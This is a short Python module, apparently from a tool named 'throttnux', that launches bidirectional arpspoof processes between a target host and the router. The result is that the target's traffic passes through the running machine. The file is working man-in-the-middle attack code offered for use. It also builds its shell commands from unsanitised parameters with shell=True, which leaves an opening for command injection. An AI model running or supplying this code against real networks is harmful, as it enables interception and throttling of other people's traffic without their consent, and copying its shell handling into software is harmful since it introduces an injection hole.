import subprocess
import logging

log = logging.getLogger("throttnux")


def arp_spoof_loop(interface, target_ip, router_ip, stop_event):
    log.info("Starting ARP spoofing...")

    proc_target = subprocess.Popen(
        f"arpspoof -i {interface} -t {target_ip} {router_ip}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    proc_router = subprocess.Popen(
        f"arpspoof -i {interface} -t {router_ip} {target_ip}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    log.info(f"ARP spoofing active → traffic from {target_ip} routed through this machine")
    stop_event.wait()

    log.info("Stopping ARP spoofing...")
    proc_target.terminate()
    proc_router.terminate()
    proc_target.wait()
    proc_router.wait()